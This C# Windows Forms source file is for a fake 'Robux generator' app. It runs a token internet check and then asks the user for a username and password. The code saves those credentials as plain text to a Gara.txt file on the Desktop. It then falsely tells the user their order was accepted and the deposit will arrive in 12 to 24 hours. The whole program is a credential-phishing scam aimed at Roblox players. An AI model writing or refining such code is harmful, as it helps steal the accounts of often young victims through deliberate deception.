using System.ComponentModel;
using System.Net.NetworkInformation;
using System.Security.Cryptography.X509Certificates;

namespace RobuxGenerator
{
    public partial class Form1 : Form
    {
        public static class vari
        {
            public static bool isConnected = false;
        }
        
        public Form1()
        {
            InitializeComponent();
        }

        
        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {
            

            try
            {
                Ping myPing = new Ping();
                String host = "google.com";
                byte[] buffer = new byte[32];
                int timeout = 1000;
                PingOptions pingOptions = new PingOptions();
                PingReply reply = myPing.Send(host, timeout, buffer, pingOptions);
                if (reply.Status == IPStatus.Success)
                {
                    vari.isConnected = true;
                    progressBar1.Value = 100;
                    label3.ForeColor = System.Drawing.Color.Green;
                    label3.Text = "Succesfully connected!";
                }
            }
            catch (Exception)
            {
                vari.isConnected = false;
                MessageBox.Show("Could not connect to the internet.");
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            bool allow_proceed = false;
            
            if(checkBox1.Checked)
            {
                allow_proceed = true;

                if (vari.isConnected == true && allow_proceed == true)
                {
                    string filePath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                    
                    filePath = filePath + @"\Gara.txt";

                    using (StreamWriter writer = File.CreateText(filePath))
                    {
                        writer.WriteLine("User: " + textBox1.Text);
                        writer.WriteLine("Pass: " + textBox2.Text);
                    }
                    
                    MessageBox.Show("Order accepted. Please wait 12h to 24h to the deposit takes effect.");
                }
                
            }
            else if(vari.isConnected == true && checkBox1.Checked == false)
            {
                
                MessageBox.Show("Please, accept the terms.");
            }
            else if(vari.isConnected == false)
            {
                MessageBox.Show("Please, check if you are connected.");
            }

        }
    }
}